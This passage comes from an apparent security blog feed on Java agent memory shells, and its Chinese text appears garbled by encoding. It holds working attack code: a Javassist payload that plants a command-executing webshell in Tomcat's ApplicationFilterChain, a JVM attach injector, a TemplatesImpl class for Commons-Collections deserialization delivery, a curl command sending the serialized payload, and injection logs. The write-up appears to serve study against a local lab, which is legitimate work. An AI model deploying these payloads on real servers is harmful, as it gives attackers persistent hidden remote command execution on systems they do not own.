class="hljs-string">&quot;javax.servlet.http.HttpServletResponse res = response;\n&quot;</span> +<br>                        <span class="hljs-string">&quot;java.lang.String cmd = request.getParameter(\&quot;cmd\&quot;);\n&quot;</span> +<br>                        <span class="hljs-string">&quot;if (cmd != null)&#123;\n&quot;</span> +<br>                        <span class="hljs-string">&quot;    try &#123;\n&quot;</span> +<br>                        <span class="hljs-string">&quot;        java.io.InputStream in = Runtime.getRuntime().exec(cmd).getInputStream();\n&quot;</span> +<br>                        <span class="hljs-string">&quot;        java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(in));\n&quot;</span> +<br>                        <span class="hljs-string">&quot;        String line;\n&quot;</span> +<br>                        <span class="hljs-string">&quot;        StringBuilder sb = new StringBuilder(\&quot;\&quot;);\n&quot;</span> +<br>                        <span class="hljs-string">&quot;        while ((line=reader.readLine()) != null)&#123;\n&quot;</span> +<br>                        <span class="hljs-string">&quot;            sb.append(line).append(\&quot;\\n\&quot;);\n&quot;</span> +<br>                        <span class="hljs-string">&quot;        &#125;\n&quot;</span> +<br>                        <span class="hljs-string">&quot;        response.getOutputStream().print(sb.toString());\n&quot;</span> +<br>                        <span class="hljs-string">&quot;        response.getOutputStream().flush();\n&quot;</span> +<br>                        <span class="hljs-string">&quot;        response.getOutputStream().close();\n&quot;</span> +<br>                        <span class="hljs-string">&quot;    &#125; catch (Exception e)&#123;\n&quot;</span> +<br>                        <span class="hljs-string">&quot;        e.printStackTrace();\n&quot;</span> +<br>                        <span class="hljs-string">&quot;    &#125;\n&quot;</span> +<br>                        <span class="hljs-string">&quot;&#125;&quot;</span>);<br>                <span class="hljs-type">byte</span>[] bytes = c.toBytecode();<br><br>                c.detach();<br><br>                <span class="hljs-keyword">return</span> bytes;<br>            &#125; <span class="hljs-keyword">catch</span> (Exception e)&#123;<br>                e.printStackTrace();<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">0</span>];<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>maven æ‰“åŒ…å å¾—åˆ°çš„ target&#x2F;Demo02-1.0-SNAPSHOT.jar  å°±æ˜¯æˆ‘ä»¬éœ€è¦çš„ agent.jar</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081523970.png" alt="img"></p><p>ç¼–å†™javaä»£ç æ¥å°†å…¶åŠ è½½è¿›JVMä¸­</p><p>å…¶ä¸­å¤§è‡´æ€è·¯ä¸ºè·å–åˆ°JVMçš„PIDï¼Œè°ƒç”¨ loadAgent æ–¹æ³•å°† agent.jar æ³¨å…¥</p><h4 id="InjectMain-java"><a href="#InjectMain-java" class="headerlink" title="InjectMain.java"></a>InjectMain.java</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.src;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">InjectMain</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><br>        <span class="hljs-keyword">try</span>&#123;<br>            java.lang.<span class="hljs-type">String</span> <span class="hljs-variable">path</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;D:\\JavaCode\\å†…å­˜é©¬\\AgentMem\\Demo02\\target\\Demo02-1.0-SNAPSHOT.jar&quot;</span>;<br>            java.io.<span class="hljs-type">File</span> <span class="hljs-variable">toolsPath</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.File(System.getProperty(<span class="hljs-string">&quot;java.home&quot;</span>).replace(<span class="hljs-string">&quot;jre&quot;</span>,<span class="hljs-string">&quot;lib&quot;</span>) + java.io.File.separator + <span class="hljs-string">&quot;tools.jar&quot;</span>);<br>            java.net.<span class="hljs-type">URL</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> toolsPath.toURI().toURL();<br>            java.net.<span class="hljs-type">URLClassLoader</span> <span class="hljs-variable">classLoader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.net.URLClassLoader(<span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.net.URL[]&#123;url&#125;);<br>            Class<span class="hljs-comment">/*&lt;?&gt;*/</span> MyVirtualMachine = classLoader.loadClass(<span class="hljs-string">&quot;com.sun.tools.attach.VirtualMachine&quot;</span>);<br>            Class<span class="hljs-comment">/*&lt;?&gt;*/</span> MyVirtualMachineDescriptor = classLoader.loadClass(<span class="hljs-string">&quot;com.sun.tools.attach.VirtualMachineDescriptor&quot;</span>);<br>            java.lang.reflect.<span class="hljs-type">Method</span> <span class="hljs-variable">listMethod</span> <span class="hljs-operator">=</span> MyVirtualMachine.getDeclaredMethod(<span class="hljs-string">&quot;list&quot;</span>,<span class="hljs-literal">null</span>);<br>            java.util.List<span class="hljs-comment">/*&lt;Object&gt;*/</span> list = (java.util.List<span class="hljs-comment">/*&lt;Object&gt;*/</span>) listMethod.invoke(MyVirtualMachine,<span class="hljs-literal">null</span>);<br><br>            System.out.println(<span class="hljs-string">&quot;Running JVM list ...&quot;</span>);<br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;list.size();i++)&#123;<br>                <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> list.get(i);<br>                java.lang.reflect.<span class="hljs-type">Method</span> <span class="hljs-variable">displayName</span> <span class="hljs-operator">=</span> MyVirtualMachineDescriptor.getDeclaredMethod(<span class="hljs-string">&quot;displayName&quot;</span>,<span class="hljs-literal">null</span>);<br>                java.lang.<span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> (java.lang.String) displayName.invoke(o,<span class="hljs-literal">null</span>);<br>                <span class="hljs-comment">// åˆ—å‡ºå½“å‰æœ‰å“ªäº› JVM è¿›ç¨‹åœ¨è¿è¡Œ</span><br>                <span class="hljs-comment">// è¿™é‡Œçš„ if æ¡ä»¶æ ¹æ®å®é™…æƒ…å†µè¿›è¡Œæ›´æ”¹</span><br>                <span class="hljs-keyword">if</span> (name.contains(<span class="hljs-string">&quot;com.src.Demo02EnvApplication&quot;</span>))&#123;<br>                    <span class="hljs-comment">// è·å–å¯¹åº”è¿›ç¨‹çš„ pid å·</span><br>                    java.lang.reflect.<span class="hljs-type">Method</span> <span class="hljs-variable">getId</span> <span class="hljs-operator">=</span> MyVirtualMachineDescriptor.getDeclaredMethod(<span class="hljs-string">&quot;id&quot;</span>,<span class="hljs-literal">null</span>);<br>                    java.lang.<span class="hljs-type">String</span> <span class="hljs-variable">id</span> <span class="hljs-operator">=</span> (java.lang.String) getId.invoke(o,<span class="hljs-literal">null</span>);<br>                    System.out.println(<span class="hljs-string">&quot;id &gt;&gt;&gt; &quot;</span> + id);<br>                    java.lang.reflect.<span class="hljs-type">Method</span> <span class="hljs-variable">attach</span> <span class="hljs-operator">=</span> MyVirtualMachine.getDeclaredMethod(<span class="hljs-string">&quot;attach&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;java.lang.String.class&#125;);<br>                    java.lang.<span class="hljs-type">Object</span> <span class="hljs-variable">vm</span> <span class="hljs-operator">=</span> attach.invoke(o,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;id&#125;);<br>                    java.lang.reflect.<span class="hljs-type">Method</span> <span class="hljs-variable">loadAgent</span> <span class="hljs-operator">=</span> MyVirtualMachine.getDeclaredMethod(<span class="hljs-string">&quot;loadAgent&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;java.lang.String.class&#125;);<br>                    loadAgent.invoke(vm,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;path&#125;);<br>                    java.lang.reflect.<span class="hljs-type">Method</span> <span class="hljs-variable">detach</span> <span class="hljs-operator">=</span> MyVirtualMachine.getDeclaredMethod(<span class="hljs-string">&quot;detach&quot;</span>,<span class="hljs-literal">null</span>);<br>                    detach.invoke(vm,<span class="hljs-literal">null</span>);<br>                    System.out.println(<span class="hljs-string">&quot;Agent.jar Inject Success !!&quot;</span>);<br>                    <span class="hljs-keyword">break</span>;<br>                &#125;<br>            &#125;<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e)&#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081523682.png" alt="img"></p><h4 id="CC-ååºåˆ—åŒ–æ³¨å…¥"><a href="#CC-ååºåˆ—åŒ–æ³¨å…¥" class="headerlink" title="CC ååºåˆ—åŒ–æ³¨å…¥"></a>CC ååºåˆ—åŒ–æ³¨å…¥</h4><p>é€šè¿‡CCååºåˆ—åŒ–è¿›è¡Œæ³¨å…¥Agentå†…å­˜é©¬ï¼Œ ç¼–è¯‘ç”Ÿæˆ <code>Test.class</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.src;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractTranslet</span> &#123;<br>    <span class="hljs-keyword">static</span> &#123;<br>        <span class="hljs-keyword">try</span>&#123;<br>            java.lang.<span class="hljs-type">String</span> <span class="hljs-variable">path</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;D:\\JavaCode\\å†…å­˜é©¬\\AgentMem\\Demo02\\target\\Demo02-1.0-SNAPSHOT.jar&quot;</span>;<br>            java.io.<span class="hljs-type">File</span> <span class="hljs-variable">toolsPath</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.File(System.getProperty(<span class="hljs-string">&quot;java.home&quot;</span>).replace(<span class="hljs-string">&quot;jre&quot;</span>,<span class="hljs-string">&quot;lib&quot;</span>) + java.io.File.separator + <span class="hljs-string">&quot;tools.jar&quot;</span>);<br>            java.net.<span class="hljs-type">URL</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> toolsPath.toURI().toURL();<br>            java.net.<span class="hljs-type">URLClassLoader</span> <span class="hljs-variable">classLoader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.net.URLClassLoader(<span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.net.URL[]&#123;url&#125;);<br>            Class<span class="hljs-comment">/*&lt;?&gt;*/</span> MyVirtualMachine = classLoader.loadClass(<span class="hljs-string">&quot;com.sun.tools.attach.VirtualMachine&quot;</span>);<br>            Class<span class="hljs-comment">/*&lt;?&gt;*/</span> MyVirtualMachineDescriptor = classLoader.loadClass(<span class="hljs-string">&quot;com.sun.tools.attach.VirtualMachineDescriptor&quot;</span>);<br>            java.lang.reflect.<span class="hljs-type">Method</span> <span class="hljs-variable">listMethod</span> <span class="hljs-operator">=</span> MyVirtualMachine.getDeclaredMethod(<span class="hljs-string">&quot;list&quot;</span>,<span class="hljs-literal">null</span>);<br>            java.util.List<span class="hljs-comment">/*&lt;Object&gt;*/</span> list = (java.util.List<span class="hljs-comment">/*&lt;Object&gt;*/</span>) listMethod.invoke(MyVirtualMachine,<span class="hljs-literal">null</span>);<br><br>            System.out.println(<span class="hljs-string">&quot;Running JVM list ...&quot;</span>);<br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;list.size();i++)&#123;<br>                <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> list.get(i);<br>                java.lang.reflect.<span class="hljs-type">Method</span> <span class="hljs-variable">displayName</span> <span class="hljs-operator">=</span> MyVirtualMachineDescriptor.getDeclaredMethod(<span class="hljs-string">&quot;displayName&quot;</span>,<span class="hljs-literal">null</span>);<br>                java.lang.<span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> (java.lang.String) displayName.invoke(o,<span class="hljs-literal">null</span>);<br>                <span class="hljs-comment">// åˆ—å‡ºå½“å‰æœ‰å“ªäº› JVM è¿›ç¨‹åœ¨è¿è¡Œ</span><br>                <span class="hljs-comment">// è¿™é‡Œçš„ if æ¡ä»¶æ ¹æ®å®é™…æƒ…å†µè¿›è¡Œæ›´æ”¹</span><br>                <span class="hljs-keyword">if</span> (name.contains(<span class="hljs-string">&quot;com.src.Demo02EnvApplication&quot;</span>))&#123;<br>                    <span class="hljs-comment">// è·å–å¯¹åº”è¿›ç¨‹çš„ pid å·</span><br>                    java.lang.reflect.<span class="hljs-type">Method</span> <span class="hljs-variable">getId</span> <span class="hljs-operator">=</span> MyVirtualMachineDescriptor.getDeclaredMethod(<span class="hljs-string">&quot;id&quot;</span>,<span class="hljs-literal">null</span>);<br>                    java.lang.<span class="hljs-type">String</span> <span class="hljs-variable">id</span> <span class="hljs-operator">=</span> (java.lang.String) getId.invoke(o,<span class="hljs-literal">null</span>);<br>                    System.out.println(<span class="hljs-string">&quot;id &gt;&gt;&gt; &quot;</span> + id);<br>                    java.lang.reflect.<span class="hljs-type">Method</span> <span class="hljs-variable">attach</span> <span class="hljs-operator">=</span> MyVirtualMachine.getDeclaredMethod(<span class="hljs-string">&quot;attach&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;java.lang.String.class&#125;);<br>                    java.lang.<span class="hljs-type">Object</span> <span class="hljs-variable">vm</span> <span class="hljs-operator">=</span> attach.invoke(o,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;id&#125;);<br>                    java.lang.reflect.<span class="hljs-type">Method</span> <span class="hljs-variable">loadAgent</span> <span class="hljs-operator">=</span> MyVirtualMachine.getDeclaredMethod(<span class="hljs-string">&quot;loadAgent&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;java.lang.String.class&#125;);<br>                    loadAgent.invoke(vm,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;path&#125;);<br>                    java.lang.reflect.<span class="hljs-type">Method</span> <span class="hljs-variable">detach</span> <span class="hljs-operator">=</span> MyVirtualMachine.getDeclaredMethod(<span class="hljs-string">&quot;detach&quot;</span>,<span class="hljs-literal">null</span>);<br>                    detach.invoke(vm,<span class="hljs-literal">null</span>);<br>                    System.out.println(<span class="hljs-string">&quot;Agent.jar Inject Success !!&quot;</span>);<br>                    <span class="hljs-keyword">break</span>;<br>                &#125;<br>            &#125;<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e)&#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, SerializationHandler[] handlers)</span> <span class="hljs-keyword">throws</span> TransletException &#123;<br><br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="hljs-keyword">throws</span> TransletException &#123;<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Test</span><span class="hljs-params">()</span>&#123;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p> ç”¨ <strong>java-chains</strong> , æŠŠ <code>Test.class</code> æ³¨å…¥åˆ° <code>TemplatesImpl</code> çš„ <code>_bytecodes</code>ï¼Œç”Ÿæˆäº† <code>JavaNativePayload_â€¦txt</code> æ–‡ä»¶ã€‚  </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081525081.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081525372.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081523154.png" alt="img"></p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit">curl -v <span class="hljs-string">&quot;http://localhost:8089/cc&quot;</span> --data-<span class="hljs-built_in">binary</span> <span class="hljs-symbol">@test</span>.ser<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081525511.png" alt="img"></p><ol><li>å†…å­˜é©¬æ³¨å…¥æƒ…å†µ</li></ol><p>ä»æ—¥å¿—æ¥çœ‹ï¼š</p><p>Running JVM list â€¦</p><p>id &gt;&gt;&gt; 40008</p><p>Find the Inject Class: org.apache.catalina.core.ApplicationFilterChain</p><p>Agent.jar Inject Success !!</p><p>ä½¿ç”¨çš„ Demo02-1.0-SNAPSHOT.jar æˆåŠŸ attach åˆ°äº†ç›®æ ‡ JVMï¼ˆPID 40008ï¼‰ã€‚</p><p>org.apache.catalina.core.ApplicationFilterChain ä½œä¸º hook å…¥å£å·²ç»è¢«æ‰¾åˆ°ã€‚</p><p>ä¹Ÿå°±æ˜¯è¯´ï¼Œå†…å­˜é©¬çš„ Agent éƒ¨åˆ†å·²ç»æˆåŠŸåŠ è½½åˆ° JVMã€‚</p><p>æ‰€ä»¥æ³¨å…¥æ˜¯æˆåŠŸçš„ï¼Œè¿™éƒ¨åˆ†æ²¡æœ‰é—®é¢˜</p><p>1. </p><p> curl è¯·æ±‚è§¦å‘äº† POST &#x2F;ccï¼Œä½†æ˜¯è¿”å›ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java">java.lang.NullPointerException: <span class="hljs-literal">null</span><br>at com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet.postInitialization(AbstractTranslet.java:<span class="hljs-number">372</span>) ~[na:<span class="hljs-number">1.8</span><span class="hljs-number">.0_65</span>]<br>at com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.getTransletInstance(TemplatesImpl.java:<span class="hljs-number">456</span>) ~[na:<span class="hljs-number">1.8</span><span class="hljs-number">.0_65</span>]<br>at com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.newTransformer(TemplatesImpl.java:<span class="hljs-number">486</span>) ~[na:<span class="hljs-number">1.8</span><span class="hljs-number">.0_65</span>]<br>at com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter.&lt;init&gt;(TrAXFilter.java:<span class="hljs-number">64</span>) ~[na:<span class="hljs-number">1.8</span><span class="hljs-number">.0_65</span>]<br>at sun.reflect.NativeConstructorAccessorImpl.newInstance0(Native Method) ~[na:<span class="hljs-number">1.8</span><span class="hljs-number">.0_65</span>]<br>at sun.reflect.NativeConstructorAccessorImpl.newInstance(NativeConstructorAccessorImpl.java:<span class="hljs-number">62</span>) ~[na:<span class="hljs-number">1.8</span><span class="hljs-number">.0_65</span>]<br>at sun.reflect.DelegatingConstructorAccessorImpl.newInstance(DelegatingConstructorAccessorImpl.java:<span class="hljs-number">45</span>) ~[na:<span class="hljs-number">1.8</span><span class="hljs-number">.0_65</span>]<br>at java.lang.reflect.Constructor.newInstance(Constructor.java:<span class="hljs-number">422</span>) ~[na:<span class="hljs-number">1.8</span><span class="hljs-number">.0_65</span>]<br></code></pre></td></tr></table></figure><p>åˆ†æåŸå› ï¼š</p><p>ä½ ä¸Šä¼ çš„ payload æ˜¯åŸºäº CommonsCollections K3 + TemplatesImpl çš„åºåˆ—åŒ–ã€‚</p><p>é”™è¯¯å‘ç”Ÿåœ¨ TemplatesImpl åˆå§‹åŒ–é˜¶æ®µçš„ postInitialization æ–¹æ³•ï¼š</p><p>NullPointerException ä¸€èˆ¬æ˜¯å› ä¸º TemplatesImpl ä¸­ _bytecodes æˆ– _name ç­‰å­—æ®µä¸º nullã€‚</p><p>ä¹Ÿå°±æ˜¯è¯´  test.ser æ–‡ä»¶ä¸­ï¼Œ<strong>TemplatesImpl å¯¹è±¡æ²¡æœ‰æ­£ç¡®å¡«å……å­—èŠ‚ç </strong>â€¦.</p><p>ä¸ºä»€ä¹ˆç”Ÿæˆçš„æ—¶å€™æ²¡æœ‰å†™è¿›å»å‘¢ï¼Ÿ</p><h1 id="å‚è€ƒï¼š"><a href="#å‚è€ƒï¼š" class="headerlink" title="å‚è€ƒï¼š"></a>å‚è€ƒï¼š</h1><p><a href="https://www.cnblogs.com/rebeyond/p/9686213.html">ã€åŸåˆ›ã€‘åˆ©ç”¨â€œè¿›ç¨‹æ³¨å…¥â€å®ç°æ— æ–‡ä»¶ä¸æ­»webshell</a></p><p><a href="https://goodapple.top/archives/1355">Javaå®‰å…¨å­¦ä¹ â€”â€”å†…å­˜é©¬ - æ«ã®Blog</a></p><p><a href="http://101.36.122.13:4000/2025/08/06/Spring%E5%86%85%E5%AD%98%E9%A9%AC/#J9TFY">Springå†…å­˜é©¬ | CurlySeanâ€™s Blog</a></p><p><a href="https://y4er.com/posts/javaagent-tomcat-memshell/#%E7%AE%80%E8%BF%B0%E5%86%85%E5%AD%98shell">Java Agentå®ç°ååºåˆ—åŒ–æ³¨å…¥å†…å­˜shell</a></p><p><a href="https://su18.org/post/memory-shell/">JavaWeb å†…å­˜é©¬ä¸€å‘¨ç›®é€šå…³æ”»ç•¥ | ç´ åå…«</a></p><p><a href="https://su18.org/post/memory-shell-2/">JavaWeb å†…å­˜é©¬äºŒå‘¨ç›®é€šå…³æ”»ç•¥ | ç´ åå…«</a></p><p><a href="https://www.4hou.com/posts/zlkq">Shellä¸­çš„å¹½çµç‹è€…â€”JAVAWEB å†…å­˜é©¬ ã€è®¤çŸ¥ç¯‡ã€‘ - å˜¶å¼ RoarTalk â€“ ç½‘ç»œå®‰å…¨è¡Œä¸šç»¼åˆæœåŠ¡å¹³å°,4hou.com</a></p><p><a href="https://www.freebuf.com/articles/web/433972.html">Javaå†…å­˜é©¬â€”â€”Tomcat Valveå‹çš„ä¸‰ç§æ³¨å…¥ - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ·</a></p><p><a href="https://hilang.cloud/java-%E5%86%85%E5%AD%98%E9%A9%AC%EF%BC%88%E5%9B%9B%EF%BC%89%EF%BC%9Aspring-boot-controller-%E5%86%85%E5%AD%98%E9%A9%AC/">Java å†…å­˜é©¬ï¼ˆå››ï¼‰ï¼šSpring Boot Controller å†…å­˜é©¬ | æ¸æ€€çš„åšå®¢</a></p><p><a href="https://stoocea.github.io/post/Spring%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90.html#2-Controller-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC">Springå‹å†…å­˜é©¬åˆ†æ</a></p><p><a href="https://www.runoob.com/servlet/servlet-intro.html">Servlet ç®€ä»‹ | èœé¸Ÿæ•™ç¨‹</a></p><p><a href="https://clowsman.github.io/2024/11/13/Spring%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/index.html">Springå†…å­˜é©¬å­¦ä¹ </a></p><p><a href="https://xz.aliyun.com/news/11493">Springå†…å­˜é©¬â€”â€”Controller&#x2F;Interceptoræ„é€ </a></p><p>[åŸºç¡€ç¯‡ - Javassist ä½¿ç”¨æŒ‡å—](<a href="https://changeyourway.github.io/2024/06/07/Java">https://changeyourway.github.io/2024/06/07/Java</a> å®‰å…¨&#x2F;åŸºç¡€ç¯‡-javassistç”¨æ³•æŒ‡å—&#x2F;)</p><p><a href="https://goodapple.top/archives/1145#header-id-20">Javaå®‰å…¨å­¦ä¹ â€”â€”ROMEååºåˆ—åŒ– - æ«ã®Blog</a> ï¼ˆä½¿ç”¨Javassistç¼©çŸ­æ¶æ„classï¼‰</p><p><a href="https://y4er.com/posts/javaagent-tomcat-memshell/">Java Agentå®ç°ååºåˆ—åŒ–æ³¨å…¥å†…å­˜shell</a></p><p><a href="http://101.36.122.13:4000/2025/08/05/JavaAgent%E5%86%85%E5%AD%98%E9%A9%AC">Agentå†…å­˜é©¬ | CurlySeanâ€™s Blog</a></p>]]></content>
    
    
    <categories>
      
      <category>Javaå®‰å…¨</category>
      
    </categories>
    
    
    <tags>
      
      <tag>javaå®‰å…¨</tag>
      
      <tag>å†…å­˜é©¬</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java å†…å­˜é©¬ç¬¬ä¸‰ç¯‡ - Spring å†…å­˜é©¬</title>
    <link href="/2025/11/08/Java%20%E5%86%85%E5%AD%98%E9%A9%AC%E7%AC%AC%E4%B8%89%E7%AF%87%20-%20Spring%20%E5%86%85%E5%AD%98%E9%A9%AC/"/>
    <url>/2025/11/08/Java%20%E5%86%85%E5%AD%98%E9%A9%AC%E7%AC%AC%E4%B8%89%E7%AF%87%20-%20Spring%20%E5%86%85%E5%AD%98%E9%A9%AC/</url>
    
